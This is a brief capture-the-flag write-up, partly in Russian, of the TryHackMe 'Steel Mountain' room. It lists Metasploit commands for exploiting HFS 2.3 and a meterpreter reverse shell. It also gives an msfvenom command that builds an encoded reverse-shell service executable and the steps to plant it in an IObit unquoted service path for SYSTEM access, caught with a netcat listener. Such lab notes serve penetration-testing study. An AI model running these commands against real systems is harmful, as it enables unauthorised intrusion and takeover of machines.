# Steel Mountain

## Link: https://tryhackme.com/room/steelmountain

### useful: https://www.youtube.com/watch?v=bXCeFPNWjsM&t=621s

### Стратегия:

```
1. Уязвимый веб-сервер → начальный доступ (IIS? PHP?)
   ↓ 
2. PowerShell + PowerUp.ps1 → enum уязвимостей
   ↓ 
3. Vulnerable service (IObit) → SYSTEM права через:
   - Unquoted service path 
   - Writable service executable
   ↓ 
4. msfvenom payload → reverse shell от SYSTEM
```

### Task 1

```
curl --output - http://10.81.156.200
```

### Task 2

```
whatweb -v http://10.81.156.200:8080
```

```
msfconsole
search HFS 2.3
use 4
info

target: "References"
```

```
set payload windows/meterpreter/reverse_tcp

show payload options

LHOST ->
```

##### Заметка:
```
Когда убрал meterpreter в background

sessions -l
sessions -i 1 (возвращаемся в выполнение)
```


#### gained access
```
shell

found user.txt
```

### Task 3

```
upload /home/leandoero/hack4tech/PowerUp/PowerUp.ps1

load powershell

powershell_shell

. .\PowerUp.ps1 
Invoke-AllChecks
```

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.205.204 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.e
xe
```

```
 upload /home/leandoero/hack4tech/Advanced.exe "C:\\Program Files (x86)\\IObit\\Advanced SystemCare\\"
```

```
net stop AdvancedSystemCareService9
```

#### На своей машине слушаю порт:
```
nc -lnvp nc -lnvp 4443
```

```
net start AdvancedSystemCareService9
```

#### Path: C:\Users\Administrator\Desktop\root.txt

Finally we got flag2

